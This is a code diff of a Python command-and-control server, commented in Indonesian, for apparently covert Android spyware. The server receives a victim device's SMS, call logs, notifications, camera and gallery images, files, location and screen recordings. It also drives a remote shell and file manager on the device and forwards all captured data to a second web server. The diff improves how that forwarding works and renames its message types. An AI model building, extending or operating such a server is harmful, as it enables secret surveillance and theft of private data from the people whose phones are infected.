@@ -8,13 +8,13 @@ import time
 import logging
 import sys
 import os
-import signal
 from colorama import init, Fore, Style
-import requests  # Untuk kirim data ke server2
+import signal
+import requests
 
-# --- Konfigurasi ---
+# --- Konfigurasi dari Environment Variable ---
 TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
-SERVER2_URL = os.environ.get('SERVER2_URL', 'http://localhost:9191')  # URL server2
+SERVER2_URL = os.environ.get('SERVER2_URL', '').rstrip('/')  # URL server2 dari environment
 HOST = '0.0.0.0'
 
 # --- Globals ---
@@ -25,7 +25,7 @@ in_shell_mode = False
 in_notification_mode = False
 in_gallery_mode = False
 device_current_dir = "/"
-connected_devices = {}  # Menyimpan multiple devices jika perlu
+connected_devices = {}
 
 # --- Setup ---
 init(autoreset=True)
@@ -44,37 +44,70 @@ for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'ga
     if not os.path.exists(dir_name):
         os.makedirs(dir_name)
 
+# --- Informasi Startup ---
+def print_startup_info():
+    print(Fore.CYAN + "=" * 80)
+    print(Fore.CYAN + "             REMOTE C2 TCP SERVER (SERVER1)")
+    print(Fore.CYAN + f"             Listening on port {TCP_PORT}")
+    if SERVER2_URL:
+        print(Fore.GREEN + f"             Forwarding to server2: {SERVER2_URL}")
+    else:
+        print(Fore.YELLOW + "             WARNING: SERVER2_URL not set! Web interface disabled")
+    print(Fore.CYAN + "=" * 80)
+
+print_startup_info()
+
 # --- Fungsi untuk kirim data ke server2 ---
 def forward_to_server2(data_type, payload):
     """Mengirim data ke Flask server (server2.py)"""
+    if not SERVER2_URL:
+        return  # Skip if no server2 URL configured
+    
+    if not client_address:
+        return
+    
     try:
-        response = requests.post(
-            f"{SERVER2_URL}/api/data",
-            json={
-                'type': data_type,
-                'payload': payload,
-                'client_info': {
-                    'address': client_address[0] if client_address else 'unknown',
-                    'timestamp': datetime.now().isoformat()
-                }
-            },
-            timeout=1
-        )
-        if response.status_code != 200:
-            logger.error(f"Failed to forward to server2: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Error forwarding to server2: {e}")
+        # Prepare data with client info
+        data_to_send = {
+            'type': data_type,
+            'payload': payload,
+            'client_info': {
+                'address': client_address[0] if client_address else 'unknown',
+                'timestamp': datetime.now().isoformat()
+            }
+        }
+        
+        # Send to server2 with timeout using thread agar tidak blocking
+        def send_request():
+            try:
+                response = requests.post(
+                    f"{SERVER2_URL}/api/data",
+                    json=data_to_send,
+                    timeout=2  # Timeout 2 detik
+                )
+                if response.status_code == 200:
+                    logger.debug(f"Forwarded {data_type} to server2")
+                else:
+                    logger.debug(f"Server2 returned {response.status_code}")
+            except requests.exceptions.ConnectionError:
+                logger.debug(f"Server2 not reachable at {SERVER2_URL}")
+            except requests.exceptions.Timeout:
+                logger.debug("Timeout forwarding to server2")
+            except Exception as e:
+                logger.debug(f"Error forwarding to server2: {e}")
+        
+        threading.Thread(target=send_request, daemon=True).start()
+            
     except Exception as e:
-        logger.error(f"Unexpected error forwarding to server2: {e}")
+        logger.debug(f"Error in forward_to_server2: {e}")
 
-# --- UI & Data Handlers (modifikasi untuk forward) ---
+# --- UI & Data Handlers ---
 def clear_screen(): 
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def print_header():
     print(Fore.CYAN + "=" * 80)
-    print(Fore.CYAN + "             REMOTE C2 TCP SERVER (SERVER1)")
-    print(Fore.CYAN + f"             Listening on port {TCP_PORT}")
+    print(Fore.CYAN + "             REMOTE C2 AGENT - TERMINAL")
     print(Fore.CYAN + "=" * 80)
 
 def print_device_info(info):
@@ -89,40 +122,31 @@ def print_device_info(info):
     forward_to_server2('DEVICE_INFO', info)
 
 def print_notification_log(log):
-    sys.stdout.write(f"\r{' ' * 50}\r")
+    sys.stdout.write(f"\r{' ' * (len(input_prompt()) + 5)}\r")
     sys.stdout.write(f"{Fore.MAGENTA}\n[NOTIF | {log.get('packageName', 'N/A')}]\n  {Fore.YELLOW}Title: {Fore.WHITE}{log.get('title', 'N/A')}\n  {Fore.YELLOW}Text:  {Fore.WHITE}{log.get('text', 'N/A')}\n")
+    sys.stdout.write(input_prompt())
     sys.stdout.flush()
-    # Forward ke server2
-    forward_to_server2('NOTIFICATION', log)
+    forward_to_server2('NOTIFICATION_DATA', {'notification': log})
 
 def print_sms_log(log): 
     print(f"\n{Fore.GREEN}[SMS - {log.get('userSender', 'N/A')}]: {Fore.WHITE}{log.get('content', 'N/A')}")
-    forward_to_server2('SMS', log)
+    forward_to_server2('SMS_LOG', {'log': log})
 
 def print_call_log(log):
     type_color = {"INCOMING": Fore.GREEN, "OUTGOING": Fore.YELLOW, "MISSED": Fore.RED}.get(log.get('call_type', 'UNKNOWN'), Fore.WHITE)
     print(f"\n{Fore.CYAN}[CALL] Num: {Fore.WHITE}{log.get('number', 'N/A')}|{type_color}{log.get('call_type', 'N/A')}{Style.RESET_ALL}|Dur: {log.get('duration_seconds', 'N/A')}s|Date: {log.get('date', 'N/A')}")
-    forward_to_server2('CALL', log)
+    forward_to_server2('CALL_LOG', {'log': log})
 
 def save_image(log_data, folder='captured_images'):
     try:
         filename = log_data.get('filename', f"image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
         filepath = os.path.join(folder, filename)
         
-        # Decode dan simpan
-        image_data = base64.b64decode(log_data.get('image_base64', ''))
         with open(filepath, 'wb') as f:
-            f.write(image_data)
+            f.write(base64.b64decode(log_data.get('image_base64', '')))
         
         print(f"\n{Fore.MAGENTA}[IMAGE] Saved to: {filepath}")
-        
-        # Forward ke server2 (dengan base64 yang sudah ada)
-        forward_to_server2('IMAGE', {
-            'filename': filename,
-            'image_base64': log_data.get('image_base64', ''),
-            'filepath': filepath,
-            'type': log_data.get('type', 'camera')
-        })
+        forward_to_server2('IMAGE_DATA', {'image': log_data})
     except Exception as e:
         print(f"\n{Fore.RED}[ERROR] Could not save image: {e}")
 
@@ -132,7 +156,7 @@ def print_app_list(log_data):
     for i, app in enumerate(apps): 
         print(f"{i+1}. {app.get('appName', 'N/A')} ({app.get('packageName', 'N/A')})")
     print(Fore.CYAN + "-----------------------------")
-    forward_to_server2('APP_LIST', {'apps': apps, 'count': len(apps)})
+    forward_to_server2('APP_LIST', log_data)
 
 def print_gallery_page(log_data):
     files = log_data.get('files', [])
@@ -143,27 +167,22 @@ def print_gallery_page(log_data):
         for f in files: 
             print(f"[{f.get('index')}] {f.get('name')} {Fore.YELLOW}({f.get('path', '...')}) ")
     print(Fore.CYAN + "---------------------")
-    forward_to_server2('GALLERY_PAGE', log_data)
+    forward_to_server2('GALLERY_PAGE_DATA', log_data)
 
 def handle_file_chunk(log_data, folder):
     try:
         filename = log_data.get('filename', 'downloaded_file')
         filepath = os.path.join(folder, filename)
         
-        # Decode chunk
-        chunk_data = base64.b64decode(log_data.get('chunk', ''))
-        
-        # Append ke file
         with open(filepath, 'ab') as f:
-            f.write(chunk_data)
+            f.write(base64.b64decode(log_data.get('chunk', '')))
         
-        # Hitung progress
         file_size = os.path.getsize(filepath)
         sys.stdout.write(f"\r{Fore.BLUE}[DOWNLOAD] Receiving {filename}... {file_size/1024:.1f} KB")
         sys.stdout.flush()
         
-        # Forward progress ke server2 (optional, bisa di-skip untuk mengurangi traffic)
-        if file_size % (1024*1024) < 8192:  # Update setiap ~1MB
+        # Forward progress ke server2 (optional)
+        if file_size % (1024*1024) < 8192:
             forward_to_server2('FILE_PROGRESS', {
                 'filename': filename,
                 'size': file_size,
@@ -179,10 +198,8 @@ def handle_incoming_data(data):
         payload = json.loads(data).get('data', {})
         log_type = payload.get('type', 'UNKNOWN')
         
-        # Log ke console
         logger.info(f"Received data type: {log_type} from {client_address[0] if client_address else 'unknown'}")
 
-        # Handler mapping dengan forward ke server2
         handler_map = {
             'SMS_LOG': lambda p: print_sms_log(p.get('log')),
             'CALL_LOG': lambda p: print_call_log(p.get('log')),
@@ -227,91 +244,94 @@ def handle_incoming_data(data):
         print(f"\n{Fore.RED}[ERROR] {error_msg}")
         forward_to_server2('ERROR', {'message': error_msg})
 
-# Handler tambahan untuk forwarding
+# Handler tambahan
 def handle_location(payload):
     url = payload.get('url')
     print(f"\n{Fore.YELLOW}[LOCATION] {url}")
-    forward_to_server2('LOCATION', {'url': url, 'success': True})
+    forward_to_server2('LOCATION_SUCCESS', {'url': url})
 
 def handle_location_fail(payload):
     error = payload.get('error')
     print(f"\n{Fore.RED}[LOCATION] Failed: {error}")
-    forward_to_server2('LOCATION', {'error': error, 'success': False})
+    forward_to_server2('LOCATION_FAIL', {'error': error})
 
 def handle_recorder_started(payload):
     print(f"\n{Fore.BLUE}[REC] Screen recording started...")
-    forward_to_server2('RECORDER', {'status': 'started'})
+    forward_to_server2('SCREEN_RECORDER_STARTED', {})
 
 def handle_recorder_stopped(payload):
     print(f"\n{Fore.BLUE}[REC] Recording stopped. Receiving file...")
-    forward_to_server2('RECORDER', {'status': 'stopped'})
+    forward_to_server2('SCREEN_RECORDER_STOPPED', {})
 
 def handle_file_end(payload):
     print(f"\n{Fore.GREEN}[DOWNLOAD] File {payload.get('file')} saved.")
-    forward_to_server2('FILE_COMPLETE', {'file': payload.get('file'), 'type': 'download'})
+    forward_to_server2('GET_FILE_END', {'file': payload.get('file')})
 
 def handle_gallery_end(payload):
     print(f"\n{Fore.GREEN}[GALLERY] Image {payload.get('file')} saved.")
-    forward_to_server2('FILE_COMPLETE', {'file': payload.get('file'), 'type': 'gallery'})
+    forward_to_server2('GALLERY_IMAGE_END', {'file': payload.get('file')})
 
 def handle_file_manager(payload):
     files = payload.get('files', [])
     for f in files:
         print(f"[D] {f['name']}/" if f['isDirectory'] else f['name'])
-    forward_to_server2('FILE_MANAGER', {'files': files, 'count': len(files)})
+    forward_to_server2('FILE_MANAGER_RESULT', {'files': files})
 
 def handle_shell_ls(payload):
     files = payload.get('files', [])
     for f in files:
         print(f"{Fore.CYAN if f['isDirectory'] else Fore.WHITE}{f['name']}")
-    forward_to_server2('SHELL_LS', {'files': files})
+    forward_to_server2('SHELL_LS_RESULT', {'files': files})
 
 def handle_shell_start(payload):
     global in_shell_mode, device_current_dir
     in_shell_mode = True
     device_current_dir = payload.get("current_dir", "/")
-    forward_to_server2('SHELL_MODE', {'status': 'started', 'dir': device_current_dir})
+    print(f"\n{Fore.GREEN}[SHELL] Mode started at {device_current_dir}")
+    forward_to_server2('SHELL_MODE_STARTED', {'current_dir': device_current_dir})
 
 def handle_shell_end(payload):
     global in_shell_mode
     in_shell_mode = False
-    forward_to_server2('SHELL_MODE', {'status': 'ended'})
+    print(f"\n{Fore.GREEN}[SHELL] Mode ended")
+    forward_to_server2('SHELL_MODE_ENDED', {})
 
 def handle_notif_start(payload):
     global in_notification_mode
     in_notification_mode = True
-    forward_to_server2('NOTIF_MODE', {'status': 'started'})
+    print(f"\n{Fore.MAGENTA}[NOTIFICATION] Mode started")
+    forward_to_server2('NOTIFICATION_MODE_STARTED', {})
 
 def handle_notif_end(payload):
     global in_notification_mode
     in_notification_mode = False
-    forward_to_server2('NOTIF_MODE', {'status': 'ended'})
+    print(f"\n{Fore.MAGENTA}[NOTIFICATION] Mode ended")
+    forward_to_server2('NOTIFICATION_MODE_ENDED', {})
 
 def handle_gallery_start(payload):
     global in_gallery_mode
     in_gallery_mode = True
-    forward_to_server2('GALLERY_MODE', {'status': 'started'})
+    print(f"\n{Fore.CYAN}[GALLERY] Mode started")
+    forward_to_server2('GALLERY_MODE_STARTED', {})
 
 def handle_gallery_end_mode(payload):
     global in_gallery_mode
     in_gallery_mode = False
-    forward_to_server2('GALLERY_MODE', {'status': 'ended'})
+    print(f"\n{Fore.CYAN}[GALLERY] Mode ended")
+    forward_to_server2('GALLERY_MODE_ENDED', {})
 
 def handle_gallery_scan(payload):
     print(f"\n{Fore.BLUE}[GALLERY] Scanning device...")
-    forward_to_server2('GALLERY_SCAN', {'status': 'started'})
+    forward_to_server2('GALLERY_SCAN_STARTED', {})
 
 def handle_gallery_complete(payload):
     print(f"\n{Fore.GREEN}[GALLERY] Scan complete. {payload.get('image_count')} images found.")
-    forward_to_server2('GALLERY_SCAN', {
-        'status': 'complete',
-        'count': payload.get('image_count')
-    })
+    forward_to_server2('GALLERY_SCAN_COMPLETE', {'image_count': payload.get('image_count')})
 
 def handle_cd_success(payload):
     global device_current_dir
     device_current_dir = payload.get("current_dir", "/")
-    forward_to_server2('SHELL_CD', {'dir': device_current_dir})
+    forward_to_server2('SHELL_CD_SUCCESS', {'current_dir': device_current_dir})
 
 # --- Core TCP Server ---
 def client_listener(sock):
@@ -335,11 +355,13 @@ def client_listener(sock):
             logger.error(f"Listener error: {e}")
             break
     
-    # Client disconnected
     print(f"\n{Fore.RED}Client disconnected.")
-    global client_socket
+    global client_socket, in_shell_mode, in_notification_mode, in_gallery_mode
     client_socket = None
-    forward_to_server2('CONNECTION', {'status': 'disconnected'})
+    in_shell_mode = False
+    in_notification_mode = False
+    in_gallery_mode = False
+    forward_to_server2('CONNECTION', {'status': 'disconnected', 'address': client_address[0] if client_address else 'unknown'})
 
 def send_command(cmd):
     """Mengirim command ke client"""
@@ -379,7 +401,7 @@ def shell():
             
             if not cmd_input:
                 continue
-                
+            
             # Forward command ke server2 untuk logging
             forward_to_server2('COMMAND', {
                 'command': cmd_input,
@@ -392,7 +414,7 @@ def shell():
                     print(f"{Fore.YELLOW}Sending command: exit...", flush=True)
                     send_command("exit")
                 continue
-                
+            
             cmd_parts = cmd_input.strip().split(" ", 1)
             cmd = cmd_parts[0].lower()
             
@@ -469,9 +491,6 @@ def main():
     
     signal.signal(signal.SIGINT, signal_handler)
     
-    clear_screen()
-    print_header()
-    
     # Setup TCP server
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -480,7 +499,10 @@ def main():
         server_socket.bind((HOST, TCP_PORT))
         server_socket.listen(5)
         print(f"[*] TCP Server listening on {HOST}:{TCP_PORT}")
-        print(f"[*] Forwarding data to server2 at {SERVER2_URL}")
+        if SERVER2_URL:
+            print(f"[*] Forwarding data to server2 at {SERVER2_URL}")
+        else:
+            print(f"[!] WARNING: No server2 URL configured. Set SERVER2_URL env variable to enable web interface.")
         
         # Start shell thread
         threading.Thread(target=shell, daemon=True).start()
@@ -488,7 +510,6 @@ def main():
         # Main accept loop
         while running:
             if not client_socket:
-                print("[*] Waiting for device connection...")
                 try:
                     server_socket.settimeout(1.0)
                     conn, addr = server_socket.accept()
